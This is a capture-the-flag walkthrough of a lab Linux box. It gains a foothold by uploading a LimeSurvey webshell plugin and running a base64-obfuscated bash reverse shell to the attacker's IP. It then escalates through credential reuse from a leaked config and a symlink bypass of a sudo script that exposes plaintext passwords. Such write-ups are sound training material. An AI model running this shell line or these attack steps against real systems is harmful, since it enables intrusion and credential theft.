---
machine: Marketing
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [limesurvey, plugin-upload-rce, git-leak, credential-reuse, mlocate-db-leak, symlink-bypass, sudo-misconfiguration]
date: 2026-09-13
status: retired
summary: A Linux box fronting a marketing site that hides a LimeSurvey subdomain — testing default-credential access into LimeSurvey, an authenticated malicious-plugin upload for RCE, credential harvesting from a leaked application config, and an mlocate database leak combined with a symlink bypass of a restrictive sudo script for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/marketing]
└─$ nmap-full target
[*] Running fast port discovery on target...
[*] Open ports: 22,80
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 18:04 -0400
Nmap scan report for target (192.168.208.225)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: marketing.pg - Digital Marketing for you!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds
[*] Checking if UDP/SNMP is up on target...
[!] Invalid IP address!
```

We see that we have a webapp on port 80. If we feroxbust the site we see that we have a seemingly identical webapp at `http://marketing.pg` and `http://marketing.pg/old`

```bash
feroxbuster -u http://marketing.pg -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough

200      GET      442l     1182w    18286c http://marketing.pg/
301      GET        9l       28w      310c http://marketing.pg/old => http://marketing.pg/old/
```

`whatweb` scan of the site:

```bash
whatweb http://marketing.pg
http://marketing.pg [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.208.225], JQuery, Lightbox, Script, Title[marketing.pg - Digital Marketing for you!]
```

If we read through the source code of the `/old` webpage we find a reference to `//customers-survey.marketing.pg`

```text
<div class="item"> <div class="service-item"> <div class="icon"> <img src="[assets/images/service-icon-02.png](view-source:http://marketing.pg/old/assets/images/service-icon-02.png)" alt=""> </div> <h4>Surveys</h4> <p> In order to better understand the wishes of your target group, we provide surveys <a href="[//customers-survey.marketing.pg](view-source:http://customers-survey.marketing.pg/)">here</a></p> </div> </div>
```

On the `/old` webpage we also see a list of names of team members in `Pages > About Us`

After adding `customers-survey.marketing.pg` to our `/etc/hosts` we can navigate to it and find that its running a technology called LimeSurvey and the admin email is `admin@marketing.pg`

We find that there is both an authenticated and unauthenticated RCE CVE for LimeSurvey upon looking it up.

We feroxbust `customers-survey.marketing.pg` and find `/admin`along with `/tmp` and `/modules`

We can navigate to the admin portal, look up `LimeSurvey default credentials` and successfully auth to the login page with: `admin:password`

After logging in as administrator we can inspect the webapp for a version number, we find that we are running version `5.3.24`

Upon looking up this version number of LimeSurvey, google overview tells us:

```text
LimeSurvey version 5.3.24 is ==vulnerable to authenticated Remote Code Execution (RCE) via the plugin upload feature== (similar to [CVE-2021-44967](https://ine.com/blog/cve-2021-44967-limesurvey-rce)).
```

## Foothold

At the top right we can navigate Configuration > Plugins and find that we have the ability to add .zip plugins. We will attempt to craft a malicious plugin and format it in a .zip format to add to LimeSurvey. I found one on github at: https://github.com/p0dalirius/LimeSurvey-webshell-plugin/tree/main/plugin

```bash
┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ mkdir webshell 

┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ mv webshell.php webshell

┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ mv config.xml webshell  

┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ ls
mal.zip  webshell

┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ zip -r webshell.zip webshell 
  adding: webshell/ (stored 0%)
  adding: webshell/webshell.php (deflated 64%)
  adding: webshell/config.xml (deflated 55%)
```

We can upload this successfully.

We can achieve RCE with the following POST request:

```bash
┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ curl -X POST 'http://customers-survey.marketing.pg/upload/plugins/WebShell/webshell.php' --data "action=exec&cmd=id" 

{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"} 
```

We can base64 encode a revshell into our `cmd=` field and gain a reverse shell:

```bash
┌──(kali㉿kali)-[~/oscp/marketing/LimeSurvey-webshell-plugin/plugin]
└─$ curl -X POST 'http://customers-survey.marketing.pg/upload/plugins/WebShell/webshell.php' --data "action=exec&cmd=printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNTUvODAgMD4mMSkgJg==|base64 -d|bash"
{"stdout":"","stderr":"","exec":"printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNTUvODAgMD4mMSkgJg==|base64 -d|bash"} 

www-data@marketing:/$ whoami
www-data
```

## Lateral Movement

In `/home` we see two users: `t.miller` and `m.sander`.

Inside `t.miller` we see the `local.txt` flag but are unable to read it as www-data.

We can enumerate internal running services and see we seem to have an internal SQL server running as port `127.0.0.1S:3306` is open:

```bash
www-data@marketing:/home/t.miller$ ss -tulnp
Netid                 State                  Recv-Q                  Send-Q                                   Local Address:Port                                    Peer Address:Port                 Process                 
udp                   UNCONN                 0                       0                                        127.0.0.53%lo:53                                           0.0.0.0:*                                            
tcp                   LISTEN                 0                       70                                           127.0.0.1:33060                                        0.0.0.0:*                                            
tcp                   LISTEN                 0                       151                                          127.0.0.1:3306                                         0.0.0.0:*                                            
tcp                   LISTEN                 0                       511                                            0.0.0.0:80                                           0.0.0.0:*                                            
tcp                   LISTEN                 0                       4096                                     127.0.0.53%lo:53                                           0.0.0.0:*                                            
tcp                   LISTEN                 0                       128                                            0.0.0.0:22                                           0.0.0.0:*                                
```

Inside the `/var/www/LimeSurvey` directory we see a `.git` directory:

```bash
www-data@marketing:/var/www/LimeSurvey$ ls -lah
total 232K
drwxr-xr-x  18 www-data www-data 4.0K Jul 13  2022 .
drwxr-xr-x   4 www-data www-data 4.0K Jul 13  2022 ..
-rw-r--r--   1 www-data www-data   35 Jul 13  2022 .bowerrc
-rw-r--r--   1 www-data www-data  497 Jul 13  2022 .editorconfig
-rw-r--r--   1 www-data www-data   32 Jul 13  2022 .eslintignore
-rw-r--r--   1 www-data www-data  207 Jul 13  2022 .eslintrc.json
-rw-r--r--   1 www-data www-data   67 Jul 13  2022 .flowconfig
drwxr-xr-x   8 www-data www-data 4.0K Jul 13  2022 .git
-rw-r--r--   1 www-data www-data 1.2K Jul 13  2022 .gitattributes
drwxr-xr-x   3 www-data www-data 4.0K Jul 13  2022 .github
-rw-r--r--   1 www-data www-data 4.0K Jul 13  2022 .gitignore
-rw-r--r--   1 www-data www-data 1.1K Jul 13  2022 .htaccess

```

Upon inspecting this closer this just seems to be a git repo from the official LimeSurvey github.

If we navigate to `/var/www/LimeSurvey/application/config/config.php` we can find database credentials:

```php
'db' => array(
                        'connectionString' => 'mysql:host=localhost;port=3306;dbname=limesurvey;',
                        'emulatePrepare' => true,
                        'username' => 'limesurvey_user',
                        'password' => 'EzPwz2022_dev1$$23!!',
                        'charset' => 'utf8mb4',
                        'tablePrefix' => 'lime_',
                ),
```

```bash
www-data@marketing:/var/www/LimeSurvey/application/config$ mysql -u 'limesurvey_user' -p'EzPwz2022_dev1$$23!!' -h 127.0.0.1 -P 3306
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 73
Server version: 8.0.29-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

After poking around for awhile I am unable to identify any ways to use this to escalate or move laterally. I attempt cred reuse on `t.miller` and find that I can `su t.miller` with the database user password: `EzPwz2022_dev1$$23!!`

We can collect our `local.txt` in `t.miller`'s home directory.

## Privilege Escalation

If we run `sudo -l` as `t.miller` we find the following:

```bash
t.miller@marketing:~$ sudo -l
[sudo] password for t.miller:                                                                                                                                                                                                 
Matching Defaults entries for t.miller on marketing:                                                                                                                                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                              
User t.miller may run the following commands on marketing:                                                                                                                                                                    
    (m.sander) /usr/bin/sync.sh
```

If we read the following:

```bash
t.miller@marketing:~$ cat /usr/bin/sync.sh
#! /bin/bash                                                                                                                                                                                                                  

if [ -z $1 ]; then                                                                                                                                                                                                            
    echo "error: note missing"                                                                                                                                                                                                
    exit                                                                                                                                                                                                                      
fi                                                                                                                                                                                                                            
note=$1                                                                                                                                                               
if [[ "$note" =~ .*m.sander.* ]]; then                                                                                                                                                                                        
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/m.sander/personal/notes.txt $note)

if [[ -z $difference ]]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/m.sander/personal/notes.txt

echo "[+] Updated."
```

We find that this script echoes the diff between what we pass and what is in `m.sander`'s personal notes.txt file and then updates the notes.txt file with what we passed. If we can find a file only `m.sander` can read that is not in his home directory we should be able to see the contents with this script.

We check what groups `m.sander` is a member of:

```bash
t.miller@marketing:/home$ groups m.sander
m.sander : m.sander cdrom sudo plugdev staff users mlocate
```

We can then see what files are owned by these groups:

```bash
t.miller@marketing:/dev/shm$ find / -group mlocate 2>/dev/null
/var/lib/mlocate/mlocate.db
/usr/bin/mlocate
```

We can port this .db file out of the box by hosting a python webserver on the target machine and pulling down the mlocate.db file on our kali.

```bash
┌──(kali㉿kali)-[~/oscp/marketing]
└─$ wget http://marketing.pg:8000/mlocate.db
--2026-09-13 21:09:37--  http://marketing.pg:8000/mlocate.db
Resolving marketing.pg (marketing.pg)... 192.168.208.225
Connecting to marketing.pg (marketing.pg)|192.168.208.225|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4981603 (4.8M) [application/octet-stream]
Saving to: ‘mlocate.db’

mlocate.db                             100%[============================================================================>]   4.75M  2.16MB/s    in 2.2s    

2026-09-13 21:09:40 (2.16 MB/s) - ‘mlocate.db’ saved [4981603/4981603]
```

We can use `strings` with `less` on our kali to inspect it further and find a suspicious text file with the mlocate db:

```bash
┌──(kali㉿kali)-[~/oscp/marketing]
└─$ strings mlocate.db | less

...
user
/home
m.sander
t.miller
/home/m.sander
.bash_logout
.bashrc
.profile
personal
/home/m.sander/personal
creds-for-2022.txt
notes.txt
/home/t.miller
...
```

We see suspicious file creds-for-2022.txt located shortly after the path `/home/m.sander/personal`. If we attempt to read the `/home/m.sander/personal/creds-for-2022.txt` path, we get error: forbidden from the regex filename sanitization of the sync.sh:

```bash
t.miller@marketing:/dev/shm$ sudo -u m.sander /usr/bin/sync.sh /home/m.sander/personal/creds-for-2022.txt
error: forbidden
```

To bypass this we can utilize a symlink, making a link which references this file which would otherwise be sanitized:

```bash
t.miller@marketing:~$ ln -s /home/m.sander/personal/creds-for-2022.txt supersecretcredfile
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh supersecretcredfile 
Difference: 1,3c1,8
< == NOTES ==
< - remove vhost from website (done)
< - update to newer version (todo)
\ No newline at end of file
---
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
> 
> github:
> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
> 
> gmail:
> michael_sander@gmail.com - EzPwz2022_12345678#!
\ No newline at end of file
[+] Updated.
```

We can try each of these passwords with `su`. We succeed with the gmail password:

```bash
t.miller@marketing:~$ su m.sander
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

m.sander@marketing:/home/t.miller$ whoami
m.sander
```

Since we saw earlier that `m.sander` is a member of the `sudo` group, we can `sudo su` and retrieve the proof.txt from the `/root` directory:

```bash
m.sander@marketing:/home/t.miller$ sudo su
[sudo] password for m.sander: 
root@marketing:/home/t.miller# cd /root
root@marketing:~# ls
notes.txt  personal.txt  proof.txt  snap  sync.sh
root@marketing:~# cat proof.txt
```
